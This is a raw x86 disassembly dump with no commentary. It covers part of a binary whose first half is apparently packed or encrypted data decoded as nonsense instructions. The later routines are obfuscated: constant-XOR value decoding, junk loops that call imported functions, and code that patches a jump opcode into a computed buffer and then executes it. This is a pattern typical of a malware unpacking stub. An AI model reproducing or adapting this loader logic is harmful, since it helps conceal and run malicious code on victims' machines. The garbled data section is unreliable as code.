  406e42:	pop    esp
  406e43:	fmul   DWORD PTR [edi+0x5a]
  406e46:	outs   dx,DWORD PTR ds:[esi]
  406e47:	xchg   edi,eax
  406e48:	mov    ah,BYTE PTR [ecx]
  406e4a:	jmp    0xac904627
  406e4f:	pop    edx
  406e50:	scas   al,BYTE PTR es:[di]
  406e52:	stos   BYTE PTR es:[edi],al
  406e53:	sar    DWORD PTR [ebx-0x4616b75],0x4b
  406e5a:	scas   al,BYTE PTR es:[edi]
  406e5b:	dec    ebx
  406e5c:	mov    BYTE PTR [edi-0x51],al
  406e5f:	cmp    al,0xac
  406e61:	pushf  
  406e62:	jle    0x406e2f
  406e64:	xchg   esi,eax
  406e65:	sub    ebp,DWORD PTR [ebx+edx*1]
  406e68:	adc    al,0xaa
  406e6a:	xchg   BYTE PTR [edi+0x20d99d9c],al
  406e70:	mov    bl,BYTE PTR [ebp+0x28]
  406e73:	cmp    edx,DWORD PTR [esp+edx*8+0x2a]
  406e77:	gs push esi
  406e79:	les    edi,FWORD PTR [edi]
  406e7b:	or     ch,ch
  406e7d:	popa   
  406e7e:	sbb    DWORD PTR [edx+0x2371766d],ebx
  406e84:	xchg   edi,eax
  406e85:	push   edx
  406e86:	sub    BYTE PTR [ebx],ch
  406e88:	call   0xab8d:0xdd899d43
  406e8f:	or     bl,BYTE PTR [ecx+edi*8-0x18]
  406e93:	sbb    ecx,DWORD PTR [esi+edx*2+0x75]
  406e97:	dec    edx
  406e98:	dec    eax
  406e99:	add    ebp,DWORD PTR [esp+ecx*2+0x4717502d]
  406ea0:	jmp    0x406e2a
  406ea2:	in     eax,dx
  406ea3:	sub    eax,0x695cbb1d
  406ea8:	or     dl,BYTE PTR [edx+0x1c953032]
  406eae:	loopne 0x406ef2
  406eb0:	push   cs
  406eb1:	jae    0x406eb4
  406eb3:	outs   dx,BYTE PTR ds:[esi]
  406eb4:	sbb    ch,ch
  406eb6:	sbb    al,BYTE PTR [eax-0x401a2430]
  406ebc:	test   al,0xfd
  406ebe:	add    dh,BYTE PTR [ecx-0x5bfbbd2b]
  406ec4:	repz mov ecx,DWORD PTR [edi+0xbf2414d]
  406ecb:	data16 icebp 
  406ecd:	jge    0x406e5b
  406ecf:	jg     0x406f00
  406ed1:	mov    DWORD PTR [esi-0x4c],edi
  406ed4:	(bad)  
  406ed6:	test   BYTE PTR [esi*8+0x1ce6a850],dh
  406edd:	push   esi
  406ede:	sbb    DWORD PTR [ebx+0x59086191],0x57
  406ee5:	test   DWORD PTR ds:0x63050c82,ecx
  406eeb:	fldenv [edi+0x6f]
  406eee:	cmp    DWORD PTR [ebx+0x63ecc01e],ebx
  406ef4:	mov    al,0x64
  406ef6:	fisttp DWORD PTR [edi-0x60]
  406ef9:	jmp    0xad6aee0e
  406efe:	les    ebx,FWORD PTR [eax]
  406f00:	loop   0x406f65
  406f02:	(bad)  
  406f03:	aam    0xba
  406f05:	pushf  
  406f06:	pop    esp
  406f07:	lock pop ebp
  406f09:	stos   DWORD PTR es:[edi],eax
  406f0a:	push   0x5dee4408
  406f0f:	xchg   ebp,eax
  406f10:	cmp    al,0x1
  406f12:	ror    ah,cl
  406f14:	or     BYTE PTR [edx+ebp*1],dh
  406f17:	into   
  406f18:	add    ecx,ebp
  406f1a:	mov    ah,0xe8
  406f1c:	in     al,0x47
  406f1e:	test   eax,0x64dfc445
  406f23:	sub    dh,bl
  406f25:	inc    ecx
  406f26:	daa    
  406f27:	push   esp
  406f28:	add    al,0x4d
  406f2a:	push   ds
  406f2b:	jl     0x406fac
  406f2d:	mov    ch,0x1b
  406f2f:	mov    BYTE PTR [bx+di-0x5d],0x1a
  406f34:	imul   esi,DWORD PTR [eax-0x4c],0x51623c9d
  406f3b:	and    eax,0xd358963f
  406f40:	sbb    BYTE PTR [esi-0x6c],0xc9
  406f44:	xor    DWORD PTR [esp+ecx*2-0x2fc1461d],edi
  406f4b:	loope  0x406f9b
  406f4d:	jge    0x406ef5
  406f4f:	mov    ebp,0x679f6e3a
  406f54:	push   edi
  406f55:	fdivr  st(2),st
  406f57:	add    dl,dh
  406f59:	pop    ds
  406f5a:	adc    al,0xd6
  406f5d:	fs pop ebx
  406f5f:	nop
  406f60:	pop    eax
  406f61:	pop    ecx
  406f62:	sub    DWORD PTR [ebx],esi
  406f64:	retf   
  406f65:	mov    ds:0x2646391c,eax
  406f6a:	sar    BYTE PTR [ebx+0x5133d835],0x35
  406f71:	in     al,dx
  406f72:	push   ebp
  406f73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f74:	sbb    eax,0x3f35630c
  406f79:	cmp    DWORD PTR [esi+eax*2],edi
  406f7c:	xchg   BYTE PTR [edi+0x1bb5e0a8],dl
  406f82:	ret    0xcd0a
  406f85:	push   0x6edcb16f
  406f8a:	scas   eax,DWORD PTR es:[edi]
  406f8b:	rcr    DWORD PTR [edx+0x29b07c36],0x33
  406f92:	dec    esp
  406f93:	dec    edx
  406f94:	int    0x43
  406f96:	sbb    esi,DWORD PTR [eax]
  406f98:	add    bl,ah
  406f9a:	addr16 pushf 
  406f9c:	dec    esp
  406f9d:	dec    esp
  406f9e:	xchg   esi,eax
  406f9f:	xor    al,0x2f
  406fa1:	(bad)  
  406fa2:	rcr    BYTE PTR [esi+0x6d],1
  406fa5:	sbb    al,0x84
  406fa7:	inc    ebx
  406fa8:	add    BYTE PTR [ebp-0x5a],ah
  406fab:	repnz cs dec edi
  406fae:	jmp    0x406ffb
  406fb0:	and    ebx,DWORD PTR [edi]
  406fb2:	aas    
  406fb3:	sbb    al,0x8f
  406fb5:	aam    0x18
  406fb7:	sbb    BYTE PTR [ecx+esi*2-0x1e],0x89
  406fbc:	mov    ds:0xce513bd9,al
  406fc1:	call   0x4f7dab5e
  406fc6:	mov    ecx,DWORD PTR [edi]
  406fc8:	in     al,0x37
  406fca:	data16 and dh,ch
  406fcd:	shl    DWORD PTR [edi+0x46],0xe
  406fd1:	adc    ebx,DWORD PTR [eax+ecx*2-0x62]
  406fd5:	inc    eax
  406fd6:	dec    ebp
  406fd7:	int3   
  406fd8:	xchg   edx,eax
  406fd9:	lea    ecx,[edi]
  406fdb:	add    DWORD PTR [edx],ecx
  406fdd:	iret   
  406fde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406fdf:	test   BYTE PTR [ebx-0x31],0xf0
  406fe3:	dec    esi
  406fe4:	or     BYTE PTR [eax+edx*1+0x50],cl
  406fe8:	xor    al,0xd8
  406fea:	nop
  406feb:	and    al,0x25
  406fed:	mov    BYTE PTR [edx],dl
  406fef:	push   ebp
  406ff0:	mov    DWORD PTR [ebx-0x4ad50e54],esi
  406ff6:	add    eax,0x34d2769c
  406ffb:	pop    eax
  406ffc:	cmp    BYTE PTR [eax],0x19
  406fff:	mov    al,ds:0x2df93ea1
  407004:	jl     0x406fbb
  407006:	pop    ecx
  407007:	lock mov ah,0x66
  40700a:	mov    bl,BYTE PTR [edi]
  40700c:	sub    al,0x83
  40700e:	aas    
  40700f:	mov    ds:0xf5a7c44e,eax
  407014:	aaa    
  407015:	mov    esp,0x515fa7
  40701a:	cmc    
  40701b:	(bad)  [edx-0x565b5736]
  407021:	push   eax
  407022:	sbb    dl,BYTE PTR [ecx-0x2a5b470b]
  407028:	fsub   DWORD PTR [edx-0x5e01dada]
  40702e:	xchg   DWORD PTR [edi+0x27cf128c],esp
  407034:	and    al,0xa6
  407036:	int3   
  407037:	add    al,0xce
  407039:	pop    es
  40703a:	leave  
  40703b:	pop    ss
  40703c:	out    dx,eax
  40703d:	push   ebx
  40703e:	fucomp st(7)
  407040:	fsubrp st(3),st
  407042:	je     0x407072
  407044:	cld    
  407045:	aaa    
  407046:	dec    ecx
  407047:	jns    0x406fd7
  407049:	mov    ah,0x87
  40704b:	push   0xec11c70b
  407050:	mov    esp,0xc2b5242a
  407055:	outs   dx,BYTE PTR ds:[esi]
  407056:	adc    ch,bl
  407058:	inc    edx
  407059:	rcl    DWORD PTR [esi+0x4eab914b],cl
  40705f:	out    0xbc,eax
  407061:	ret    0x3968
  407064:	jmp    0xb2d7:0xb9d1960f
  40706b:	or     eax,0x7bdcab3c
  407070:	mov    edi,0x548448ca
  407075:	inc    esp
  407076:	jnp    0x406ffb
  407078:	and    dl,BYTE PTR [edi-0x47]
  40707b:	xchg   DWORD PTR [edi+0x4c750ae0],eax
  407081:	cdq    
  407082:	dec    esp
  407083:	rcr    BYTE PTR [edx],0xe8
  407086:	xchg   DWORD PTR [ebx],esi
  407088:	sbb    dh,BYTE PTR [eax+0x5e7db05a]
  40708e:	mov    ebp,0x8e7119fa
  407093:	jle    0x4070c7
  407095:	ja     0x4070d6
  407097:	mov    es,WORD PTR [edi]
  407099:	sbb    eax,0x29c24075
  40709e:	popf   
  40709f:	fidiv  WORD PTR [ebx]
  4070a1:	fist   DWORD PTR [edi+eax*2-0x5b]
  4070a5:	mov    ds:0x41166dfe,al
  4070aa:	aas    
  4070ab:	jmp    0x6280:0x40e9f53d
  4070b2:	mov    DWORD PTR [edx-0x6],eax
  4070b5:	nop
  4070b6:	es cwde 
  4070b8:	sbb    al,0x9b
  4070ba:	call   0xdd2dd465
  4070bf:	mov    ecx,0x51f8bbd4
  4070c4:	pop    ebx
  4070c5:	xchg   esi,eax
  4070c6:	adc    eax,0x487cfcda
  4070cb:	sahf   
  4070cc:	stc    
  4070cd:	out    dx,al
  4070ce:	imul   ecx,DWORD PTR [ebx-0x3e],0x4c
  4070d2:	(bad)  
  4070d3:	mov    ds:0xeaefb6d2,eax
  4070d8:	mov    ds:0x7c9da8ed,al
  4070dd:	loopne 0x407115
  4070df:	dec    edx
  4070e0:	lahf   
  4070e1:	sub    dh,dl
  4070e3:	aam    0x4d
  4070e5:	hlt    
  4070e6:	retf   0xa23b
  4070e9:	jae    0x40713e
  4070eb:	aaa    
  4070ec:	loope  0x407095
  4070ee:	inc    ecx
  4070ef:	jmp    DWORD PTR [edi]
  4070f1:	jno    0x407128
  4070f3:	mov    BYTE PTR [ecx],bl
  4070f5:	mov    bl,0xb6
  4070f7:	rol    DWORD PTR [ebx+0x57],1
  4070fa:	xlat   BYTE PTR ds:[ebx]
  4070fb:	sbb    al,0x7b
  4070fd:	hlt    
  4070fe:	imul   edx,DWORD PTR [edx+ebp*1],0x254ffe84
  407105:	inc    edi
  407106:	jmp    0x4a430f58
  40710b:	aam    0x2c
  40710d:	push   ss
  40710e:	in     al,dx
  40710f:	int    0x27
  407111:	inc    ecx
  407112:	jbe    0x407170
  407114:	or     eax,eax
  407116:	pop    ebx
  407117:	fwait
  407118:	adc    dl,BYTE PTR [esi-0x5b]
  40711b:	dec    ebp
  40711c:	push   edx
  40711d:	sub    al,0xb7
  40711f:	pushf  
  407120:	shl    BYTE PTR [ecx-0x290d7ce2],1
  407126:	pop    esp
  407127:	xor    ecx,0x3e568c6b
  40712d:	pop    ebx
  40712e:	aad    0x5c
  407130:	cs jge 0x407192
  407133:	adc    ch,BYTE PTR ds:0x4f6b2e45
  407139:	cmp    bh,dl
  40713b:	loope  0x40717c
  40713d:	mov    ?,WORD PTR [ebp+0x5e]
  407140:	lock jg 0x4070e3
  407143:	sbb    al,0xa
  407145:	pop    esp
  407146:	or     bl,BYTE PTR [ebp+0x4a]
  407149:	mov    ?,WORD PTR [esi-0x78]
  40714c:	jbe    0x407165
  40714e:	xlat   BYTE PTR ds:[ebx]
  40714f:	sbb    eax,0x41f20669
  407154:	add    bl,BYTE PTR ds:0xa57cc29a
  40715a:	jle    0x407141
  40715c:	lods   eax,DWORD PTR ds:[esi]
  40715d:	mov    eax,eax
  40715f:	and    edi,DWORD PTR [ebx]
  407161:	pop    es
  407162:	inc    esp
  407163:	rcr    BYTE PTR [ebp-0x2f],cl
  407166:	dec    edx
  407167:	call   0x797f:0xaf6a674d
  40716e:	(bad)  
  40716f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407170:	dec    eax
  407171:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407172:	dec    ebp
  407173:	fisttp QWORD PTR [ecx-0x6880609d]
  407179:	repnz and ch,BYTE PTR ds:0xe077c417
  407180:	adc    eax,0xb2832be
  407185:	pushf  
  407186:	sub    dh,ch
  407188:	cmp    al,BYTE PTR [edi+0x1d]
  40718b:	jl     0x407181
  40718d:	pop    ss
  40718e:	or     esp,DWORD PTR [ebx-0x802f9c8]
  407194:	mov    eax,ds:0xf49677cc
  407199:	ins    DWORD PTR es:[edi],dx
  40719a:	imul   edi,DWORD PTR [ebx+0x74],0xe5ddce13
  4071a1:	ins    DWORD PTR es:[edi],dx
  4071a2:	xchg   ebx,eax
  4071a3:	mov    ah,0xed
  4071a5:	jns    0x407145
  4071a7:	push   ebx
  4071a8:	fistp  DWORD PTR [edx-0x21]
  4071ab:	daa    
  4071ac:	add    DWORD PTR [edx],0x36f995fe
  4071b2:	mov    ebp,0x264c0c11
  4071b7:	jecxz  0x40713f
  4071b9:	inc    eax
  4071ba:	out    dx,eax
  4071bb:	push   0xe124a67a
  4071c0:	xchg   esp,eax
  4071c1:	inc    ebx
  4071c2:	xchg   edi,eax
  4071c3:	xor    bl,BYTE PTR [ecx-0x155640f9]
  4071c9:	mov    bl,0xa3
  4071cb:	bound  ecx,QWORD PTR [ecx]
  4071cd:	push   ecx
  4071ce:	dec    esi
  4071cf:	fld    TBYTE PTR [esp+edi*2]
  4071d2:	in     al,0x36
  4071d4:	add    ebp,DWORD PTR [eax-0x10]
  4071d7:	mov    esi,0xeb55c3ed
  4071dc:	sahf   
  4071dd:	fbld   TBYTE PTR [ecx+0x74]
  4071e0:	mov    es,WORD PTR [eax]
  4071e2:	rol    eax,1
  4071e4:	test   BYTE PTR [eax-0x4cd16bc7],bl
  4071ea:	and    DWORD PTR [ebx-0x22],ecx
  4071ed:	pop    ebx
  4071ee:	xchg   eax,ebp
  4071f0:	repnz sub ecx,DWORD PTR [esi+0x5c]
  4071f4:	xor    al,0x22
  4071f6:	pushf  
  4071f7:	mov    bl,0x8a
  4071f9:	out    dx,al
  4071fa:	jb     0x4071b8
  4071fc:	fdivr  st,st(7)
  4071fe:	pop    ss
  4071ff:	ss jnp 0x4071e0
  407202:	outs   dx,BYTE PTR ds:[esi]
  407203:	stos   DWORD PTR es:[edi],eax
  407204:	cmp    eax,0x99867200
  407209:	ins    BYTE PTR es:[edi],dx
  40720a:	aaa    
  40720b:	xchg   dh,dh
  40720d:	pop    esi
  40720e:	(bad)  
  40720f:	dec    esi
  407210:	mov    dh,0x9e
  407212:	xor    eax,ecx
  407214:	mov    edx,0x3272dd
  407219:	add    eax,edx
  40721b:	mov    DWORD PTR [ebp+0x8],eax
  40721e:	mov    eax,DWORD PTR [ebp-0x14]
  407221:	xor    eax,ecx
  407223:	add    eax,edx
  407225:	mov    edx,DWORD PTR [ebp+0x14]
  407228:	imul   eax,DWORD PTR [edx]
  40722b:	mov    edx,DWORD PTR [ebp-0x4]
  40722e:	xor    edx,ecx
  407230:	mov    ecx,DWORD PTR [ebp+0x8]
  407233:	lea    ecx,[edx+ecx*1+0x3272dd]
  40723a:	cmp    ecx,eax
  40723c:	je     0x4072b3
  407242:	mov    edi,DWORD PTR [ebp-0x14]
  407245:	mov    eax,DWORD PTR [ebp+0x8]
  407248:	mov    edx,DWORD PTR [ebp+0x14]
  40724b:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40724f:	mov    ecx,0x7510896
  407254:	xor    edx,edx
  407256:	xor    edi,ecx
  407258:	mov    esi,0x3272dd
  40725d:	add    edi,esi
  40725f:	div    edi
  407261:	mov    edx,DWORD PTR [ebp-0x4]
  407264:	xor    edx,ecx
  407266:	lea    eax,[edx+eax*1+0x3272dd]
  40726d:	mov    edx,DWORD PTR [ebp+0x8]
  407270:	mov    edi,DWORD PTR [ebp-0x20]
  407273:	mov    DWORD PTR [edi+edx*4],eax
  407276:	mov    eax,DWORD PTR [ebp-0x14]
  407279:	mov    edx,DWORD PTR [ebp+0x8]
  40727c:	xor    eax,ecx
  40727e:	lea    eax,[eax+edx*1+0x3272dd]
  407285:	mov    DWORD PTR [ebp+0x8],eax
  407288:	mov    eax,DWORD PTR [ebp-0x14]
  40728b:	mov    edx,DWORD PTR [ebp+0x14]
  40728e:	xor    eax,ecx
  407290:	add    eax,esi
  407292:	imul   eax,DWORD PTR [edx]
  407295:	mov    edx,DWORD PTR [ebp-0x4]
  407298:	xor    edx,ecx
  40729a:	mov    ecx,DWORD PTR [ebp+0x8]
  40729d:	lea    ecx,[edx+ecx*1+0x3272dd]
  4072a4:	cmp    ecx,eax
  4072a6:	jne    0x407242
  4072ac:	mov    eax,esi
  4072ae:	jmp    0x4072b8
  4072b3:	mov    eax,0x3272dd
  4072b8:	mov    ebx,0x7510896
  4072bd:	mov    ecx,DWORD PTR [ebp-0x4]
  4072c0:	xor    ecx,ebx
  4072c2:	add    ecx,eax
  4072c4:	mov    DWORD PTR [ebp-0xc],ecx
  4072c7:	mov    ebx,0x65655
  4072cc:	add    ebx,0x3234
  4072d2:	xchg   ebx,esi
  4072d4:	xor    ebx,ebx
  4072d6:	push   esi
  4072d7:	mov    esi,ebx
  4072d9:	pop    ebx
  4072da:	mov    edx,esi
  4072dc:	add    ebx,0x1002
  4072e2:	lea    eax,[ebp-0x10]
  4072e5:	add    edx,eax
  4072e7:	add    edx,0x5
  4072ea:	push   edx
  4072eb:	inc    esi
  4072ec:	pop    ecx
  4072ed:	dec    ecx
  4072ee:	xchg   ecx,eax
  4072ef:	dec    eax
  4072f0:	xchg   ecx,eax
  4072f1:	dec    ecx
  4072f2:	xchg   ecx,edx
  4072f4:	dec    edx
  4072f5:	push   edx
  4072f6:	mov    edx,ebx
  4072f8:	pop    ebx
  4072f9:	dec    ebx
  4072fa:	call   DWORD PTR [ebx]
  4072fc:	cmp    DWORD PTR [ebp+0x10],esi
  4072ff:	je     0x40731e
  407305:	xchg   edx,eax
  407306:	push   0xb
  407308:	pop    ecx
  407309:	push   0x4
  40730b:	pop    ebx
  40730c:	inc    ebx
  40730d:	xchg   ebx,ecx
  40730f:	sub    ebx,ecx
  407311:	xchg   ebx,ecx
  407313:	dec    ecx
  407314:	dec    ecx
  407315:	mov    eax,DWORD PTR [ebp-0x1c]
  407318:	imul   eax,ecx
  40731b:	add    esp,eax
  40731d:	xchg   edx,eax
  40731e:	push   eax
  40731f:	xor    ebx,ebx
  407321:	mov    edx,esp
  407323:	dec    edx
  407324:	inc    ebx
  407325:	add    ebx,DWORD PTR [edx+ebx*1]
  407328:	dec    ebx
  407329:	xor    edx,edx
  40732b:	add    DWORD PTR [ebp-0xc],ebx
  40732e:	pop    ebx
  40732f:	mov    eax,DWORD PTR [ebp-0xc]
  407332:	pop    edi
  407333:	pop    esi
  407334:	pop    ebx
  407335:	leave  
  407336:	ret    0x10
  407339:	push   ebp
  40733a:	mov    ebp,esp
  40733c:	sub    esp,0x7c
  40733f:	and    DWORD PTR ds:0x420e92,0x0
  407349:	jmp    0x40735b
  40734e:	mov    ecx,DWORD PTR ds:0x420e92
  407354:	inc    ecx
  407355:	mov    DWORD PTR ds:0x420e92,ecx
  40735b:	cmp    DWORD PTR ds:0x420e92,0x15
  407362:	jae    0x4073cc
  407368:	cmp    DWORD PTR ds:0x420e92,0x1f
  40736f:	jne    0x407388
  407375:	push   0x3dd4
  40737a:	push   0x422018
  40737f:	push   DWORD PTR [ebp-0xc]
  407382:	call   DWORD PTR ds:0x4247e5
  407388:	jmp    0x40734e
  40738d:	mov    DWORD PTR ds:0x420f64,0x1c
  407397:	cmp    DWORD PTR ds:0x420f64,0x0
  40739e:	je     0x4073cc
  4073a4:	cmp    DWORD PTR ds:0x420f64,0x1d
  4073ab:	jne    0x4073b7
  4073b1:	call   DWORD PTR ds:0x4247f1
  4073b7:	mov    eax,ds:0x420f64
  4073bc:	dec    eax
  4073bd:	mov    ds:0x420f64,eax
  4073c2:	jmp    0x407397
  4073c7:	adc    eax,0x653
  4073cc:	push   esi
  4073cd:	and    DWORD PTR ds:0x42200c,0x0
  4073d7:	jmp    0x4073e9
  4073dc:	mov    esi,DWORD PTR ds:0x42200c
  4073e2:	inc    esi
  4073e3:	mov    DWORD PTR ds:0x42200c,esi
  4073e9:	cmp    DWORD PTR ds:0x42200c,0x16
  4073f0:	jae    0x40742e
  4073f6:	cmp    DWORD PTR ds:0x42200c,0xa
  4073fd:	jne    0x407409
  407403:	call   DWORD PTR ds:0x4247f5
  407409:	cmp    DWORD PTR ds:0x42200c,0x9
  407410:	jne    0x407423
  407416:	mov    esi,DWORD PTR ds:0x42200c
  40741c:	inc    esi
  40741d:	mov    DWORD PTR ds:0x42200c,esi
  407423:	jmp    0x4073dc
  407428:	sbb    DWORD PTR ds:0x420f00,edx
  40742e:	push   edi
  40742f:	mov    eax,ds:0x424435
  407434:	mov    DWORD PTR ds:0x420f70,0x12
  40743e:	cmp    DWORD PTR ds:0x420f70,0x0
  407445:	je     0x40748b
  40744b:	cmp    DWORD PTR ds:0x420f70,0x17
  407452:	jne    0x407479
  407458:	push   0x87b3
  40745d:	push   DWORD PTR [ebp-0x28]
  407460:	push   0x420f68
  407465:	push   0x7b70
  40746a:	push   DWORD PTR [ebp-0x18]
  40746d:	push   DWORD PTR [ebp-0x24]
  407470:	push   DWORD PTR [ebp-0x14]
  407473:	call   DWORD PTR ds:0x4247f9
  407479:	mov    edi,DWORD PTR ds:0x420f70
  40747f:	dec    edi
  407480:	mov    DWORD PTR ds:0x420f70,edi
  407486:	jmp    0x40743e
  40748b:	mov    DWORD PTR [ebp-0x24],eax
  40748e:	mov    eax,ds:0x424541
  407493:	xor    esi,edi
  407495:	mov    DWORD PTR [ebp-0x34],eax
  407498:	and    edi,DWORD PTR ds:0x420f5c
  40749e:	and    DWORD PTR [ebp-0x30],0x0
  4074a2:	and    eax,edi
  4074a4:	mov    DWORD PTR [ebp-0x2c],0xf89c85b5
  4074ab:	adc    DWORD PTR ds:0x420ef0,edx
  4074b1:	mov    DWORD PTR [ebp-0x28],0xf89c85b2
  4074b8:	mov    edi,DWORD PTR ds:0x420ec2
  4074be:	mov    eax,ds:0x420f7c
  4074c3:	sub    edi,eax
  4074c5:	sub    edi,DWORD PTR [edi+eax*1]
  4074c8:	mov    eax,DWORD PTR [ebp-0x10]
  4074cb:	or     edi,0x1b5b
  4074d1:	mov    ecx,DWORD PTR [ebp-0x10]
  4074d4:	and    DWORD PTR ds:0x420ea2,0x0
  4074de:	xor    esi,esi
  4074e0:	xor    esi,DWORD PTR ds:0x420ea2
  4074e6:	inc    esi
  4074e7:	mov    DWORD PTR ds:0x420ea2,esi
  4074ed:	cmp    DWORD PTR ds:0x420ea2,0x20
  4074f4:	jne    0x407508
  4074fa:	push   DWORD PTR [ebp-0x28]
  4074fd:	push   0x424093
  407502:	call   DWORD PTR ds:0x4247fd
  407508:	cmp    DWORD PTR ds:0x420ea2,0x19
  40750f:	jb     0x4074de
  407515:	sub    eax,ecx
  407517:	and    DWORD PTR ds:0x420fac,0x0
  407521:	xor    ecx,ecx
  407523:	or     ecx,DWORD PTR ds:0x420fac
  407529:	inc    ecx
  40752a:	mov    DWORD PTR ds:0x420fac,ecx
  407530:	cmp    DWORD PTR ds:0x420fac,0x5
  407537:	jne    0x407550
  40753d:	push   0x42414e
  407542:	push   0x0
  407544:	push   DWORD PTR [ebp-0x28]
  407547:	push   DWORD PTR [ebp-0x10]
  40754a:	call   DWORD PTR ds:0x424801
  407550:	cmp    DWORD PTR ds:0x420fac,0x4
  407557:	jne    0x40756a
  40755d:	mov    ecx,DWORD PTR ds:0x420fac
  407563:	inc    ecx
  407564:	mov    DWORD PTR ds:0x420fac,ecx
  40756a:	cmp    DWORD PTR ds:0x420fac,0x16
  407571:	jb     0x407521
  407577:	and    DWORD PTR ds:0x420f9c,0x0
  407581:	jmp    0x407593
  407586:	mov    ecx,DWORD PTR ds:0x420f9c
  40758c:	inc    ecx
  40758d:	mov    DWORD PTR ds:0x420f9c,ecx
  407593:	cmp    DWORD PTR ds:0x420f9c,0x11
  40759a:	jae    0x4075dc
  4075a0:	cmp    DWORD PTR ds:0x420f9c,0x5
  4075a7:	jne    0x4075bd
  4075ad:	push   0x420f74
  4075b2:	push   0x1cd6
  4075b7:	call   DWORD PTR ds:0x424805
  4075bd:	cmp    DWORD PTR ds:0x420f9c,0x4
  4075c4:	jne    0x4075d7
  4075ca:	mov    ecx,DWORD PTR ds:0x420f9c
  4075d0:	inc    ecx
  4075d1:	mov    DWORD PTR ds:0x420f9c,ecx
  4075d7:	jmp    0x407586
  4075dc:	mov    DWORD PTR [ebp-0x10],eax
  4075df:	xor    DWORD PTR [ebp-0x10],0xf89cb5b5
  4075e6:	mov    eax,DWORD PTR [ebp-0x18]
  4075e9:	mov    ecx,DWORD PTR [ebp-0x18]
  4075ec:	sub    eax,ecx
  4075ee:	mov    DWORD PTR [ebp-0x18],eax
  4075f1:	or     DWORD PTR [ebp-0x18],0xf89f05b5
  4075f8:	mov    eax,DWORD PTR [ebp-0xc]
  4075fb:	mov    ecx,DWORD PTR [ebp-0xc]
  4075fe:	sub    eax,ecx
  407600:	mov    DWORD PTR [ebp-0xc],eax
  407603:	or     DWORD PTR [ebp-0xc],0xf89c85f5
  40760a:	mov    eax,DWORD PTR [ebp-0x1c]
  40760d:	mov    ecx,DWORD PTR [ebp-0x1c]
  407610:	sub    eax,ecx
  407612:	mov    DWORD PTR [ebp-0x1c],eax
  407615:	or     DWORD PTR [ebp-0x1c],0xf89c85d5
  40761c:	mov    eax,DWORD PTR [ebp-0x20]
  40761f:	mov    ecx,DWORD PTR [ebp-0x20]
  407622:	sub    eax,ecx
  407624:	mov    DWORD PTR [ebp-0x20],eax
  407627:	mov    eax,DWORD PTR [ebp-0x2c]
  40762a:	mov    ecx,DWORD PTR [ebp-0x20]
  40762d:	mov    esi,0x7510896
  407632:	xor    eax,esi
  407634:	mov    edi,0x3272dd
  407639:	add    eax,edi
  40763b:	or     eax,ecx
  40763d:	mov    DWORD PTR [ebp-0x20],eax
  407640:	mov    eax,DWORD PTR [ebp-0x4]
  407643:	mov    ecx,DWORD PTR [ebp-0x4]
  407646:	sub    eax,ecx
  407648:	mov    DWORD PTR [ebp-0x4],eax
  40764b:	or     DWORD PTR [ebp-0x4],0xf89c85be
  407652:	mov    eax,DWORD PTR [ebp-0xc]
  407655:	xor    eax,esi
  407657:	add    eax,edi
  407659:	push   eax
  40765a:	mov    eax,DWORD PTR [ebp-0x10]
  40765d:	xor    eax,esi
  40765f:	add    eax,edi
  407661:	push   eax
  407662:	mov    eax,DWORD PTR [ebp-0x4]
  407665:	xor    eax,esi
  407667:	add    eax,edi
  407669:	push   eax
  40766a:	lea    eax,[ebp-0x7c]
  40766d:	push   eax
  40766e:	push   DWORD PTR [ebp-0x2c]
  407671:	push   DWORD PTR [ebp-0x28]
  407674:	call   0x410b90
  407679:	test   eax,eax
  40767b:	je     0x4076a9
  407681:	lea    eax,[ebp-0x7c]
  407684:	push   eax
  407685:	mov    eax,DWORD PTR [ebp-0x28]
  407688:	xor    eax,esi
  40768a:	add    eax,edi
  40768c:	push   eax
  40768d:	mov    eax,DWORD PTR [ebp-0x24]
  407690:	add    eax,0xaa
  407695:	push   eax
  407696:	mov    eax,DWORD PTR [ebp-0x24]
  407699:	mov    eax,DWORD PTR [eax+0x198]
  40769f:	push   DWORD PTR [eax]
  4076a1:	call   0x402470
  4076a6:	mov    DWORD PTR [ebp-0x14],eax
  4076a9:	lea    eax,[ebp+0x4]
  4076ac:	mov    DWORD PTR [ebp-0x30],eax
  4076af:	mov    eax,DWORD PTR [ebp-0x14]
  4076b2:	test   eax,eax
  4076b4:	je     0x40771c
  4076ba:	lea    eax,[ebp-0x8]
  4076bd:	mov    DWORD PTR [ebp-0x38],eax
  4076c0:	mov    eax,DWORD PTR [ebp-0x34]
  4076c3:	mov    DWORD PTR [ebp-0x8],eax
  4076c6:	mov    eax,DWORD PTR [ebp-0x8]
  4076c9:	mov    ecx,DWORD PTR [ebp-0x14]
  4076cc:	sub    eax,ecx
  4076ce:	mov    DWORD PTR [ebp-0x8],eax
  4076d1:	mov    ecx,DWORD PTR [ebp-0x4]
  4076d4:	xor    ecx,esi
  4076d6:	mov    eax,0xffcd8d23
  4076db:	sub    eax,ecx
  4076dd:	add    DWORD PTR [ebp-0x8],eax
  4076e0:	mov    eax,DWORD PTR [ebp-0x8]
  4076e3:	mov    ecx,DWORD PTR [ebp-0x14]
  4076e6:	mov    DWORD PTR [ecx+0x1],eax
  4076e9:	mov    eax,DWORD PTR [ebp-0x14]
  4076ec:	push   DWORD PTR [ebp-0x24]
  4076ef:	mov    BYTE PTR [eax],0xe9
  4076f2:	mov    eax,ds:0x4242b1
  4076f7:	push   DWORD PTR [eax]
  4076f9:	push   DWORD PTR ds:0x42450d
  4076ff:	push   DWORD PTR ds:0x4242b9
  407705:	push   DWORD PTR ds:0x4244ed
  40770b:	push   DWORD PTR ds:0x4245a5
  407711:	push   DWORD PTR [ebp-0x28]
  407714:	push   DWORD PTR [ebp-0x2c]
  407717:	mov    eax,DWORD PTR [ebp-0x14]
  40771a:	call   eax
  40771c:	mov    eax,DWORD PTR [ebp-0x30]
  40771f:	mov    ecx,DWORD PTR ds:0x4244b1
  407725:	add    DWORD PTR [eax],ecx
  407727:	pop    edi
  407728:	pop    esi
  407729:	leave  
  40772a:	ret    
  40772b:	push   ebp
  40772c:	mov    ebp,esp
  40772e:	sub    esp,0x18
  407731:	mov    DWORD PTR [ebp-0x10],0xf89f85b5
  407738:	lea    eax,[ebp+0x14]
  40773b:	mov    DWORD PTR [ebp-0x4],eax
  40773e:	jmp    0x409ab8
  407743:	das    
